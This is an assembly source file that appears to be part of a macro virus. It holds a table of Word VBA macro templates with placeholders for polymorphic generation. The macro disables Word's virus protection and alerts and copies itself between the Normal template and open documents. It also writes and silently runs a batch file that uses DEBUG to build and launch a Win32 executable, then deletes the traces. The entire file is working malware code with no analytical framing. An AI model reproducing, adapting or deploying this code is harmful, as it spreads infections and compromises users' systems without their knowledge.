   .MODEL TINY
   .CODE
   .STARTUP

   CRLF EQU <13,10>

   DB 1
   DB "'%1", CRLF
   DB "SUB AUTOCLOSE()", CRLF
   DB "ON ERROR RESUME NEXT", CRLF
   DB 0

   DB 2
   DB "OPTIONS.VIRUSPROTECTION = FALSE", CRLF
   DB 0

   DB 2
   DB "OPTIONS.CONFIRMCONVERSIONS = FALSE", CRLF
   DB 0

   DB 2
   DB "OPTIONS.SAVENORMALPROMPT = FALSE", CRLF
   DB 0

   DB 2
   DB "APPLICATION.DISPLAYALERTS = WDALERTSNONE", CRLF
   DB 0

   DB 2
   DB "SHOWVISUALBASICEDITOR = FALSE", CRLF
   DB 0

   DB 2
   DB "%2=1", CRLF
   DB 0

   DB 2
   DB "%3=1", CRLF
   DB 0

   DB 3
   DB "FOR %4 = 1 TO NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS.COUNT", CRLF
   DB 'IF NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS(%4).CODEMODULE.LINES(1,1) = "''%1" THEN %2=%4', CRLF
   DB "NEXT %4", CRLF
   DB 0

   DB 3
   DB "FOR %4 = 1 TO ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS.COUNT", CRLF
   DB 'IF ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS(%4).CODEMODULE.LINES(1,1) = "''%1" THEN %3=%4', CRLF
   DB "NEXT %4", CRLF
   DB 0

   DB 3
   DB 'OPEN "C:\%7.BAT" FOR OUTPUT AS 1', CRLF
   DB 'PRINT #1,"@ECHO OFF"', CRLF
   DB 'PRINT #1,"DEBUG <C:\COCAINE.SRC >NUL"', CRLF
   DB 'PRINT #1,"COPY C:\W32COKE.EX C:\W32COKE.EXE >NUL"', CRLF
   DB 'PRINT #1,"C:\W32COKE.EXE"', CRLF
   DB 'PRINT #1,"DEL C:\W32COKE.EX >NUL"', CRLF
   DB 'PRINT #1,"DEL C:\COCAINE.SRC >NUL"', CRLF
   DB 'PRINT #1,"DEL C:\COCAINE.SYS >NUL"', CRLF
   DB 'PRINT #1,"DEL C:\W32COKE.EXE >NUL"', CRLF
   DB 'PRINT #1,"DEL C:\%7.BAT >NUL"', CRLF
   DB 'CLOSE #1', CRLF
   DB 0

   DB 4
   DB "SET %5 = NORMALTEMPLATE.VBPROJECT.VBCOMPONENTS(%2).CODEMODULE", CRLF
   DB 0

   DB 4
   DB "SET %6 = ACTIVEDOCUMENT.VBPROJECT.VBCOMPONENTS(%3).CODEMODULE", CRLF
   DB 0

   DB 5
   DB 'IF %5.LINES(1, 1) <> "''%1" THEN', CRLF
   DB "%5.DELETELINES 1, %5.COUNTOFLINES", CRLF
   DB "%5.INSERTLINES 1, %6.LINES(1, %6.COUNTOFLINES)", CRLF
   DB "END IF", CRLF
   DB 0

   DB 5
   DB 'IF %6.LINES(1, 1) <> "''%1" THEN', CRLF
   DB "%6.DELETELINES 1, %6.COUNTOFLINES", CRLF
   DB "%6.INSERTLINES 1, %5.LINES(1, %5.COUNTOFLINES)", CRLF
   DB "END IF", CRLF
   DB 0

   DB 6
   ;CREATE DEBUG SCRIPT
   DB 0

   DB 7
   DB 'OPEN "C:\ANCEV.SYS" FOR OUTPUT AS 1', CRLF
   DB 'PRINT #1,""', CRLF
   DB "CLOSE #1", CRLF
   DB 0

   DB 7
   DB "SHELL %7.BAT, VBHIDE", CRLF
   DB "FOR %4=1 TO 100", CRLF
   DB "NEXT %4", CRLF
   DB "KILL %7.BAT", CRLF
   DB 0

   DB 8
   DB "END SUB", CRLF
   DB 0

   END
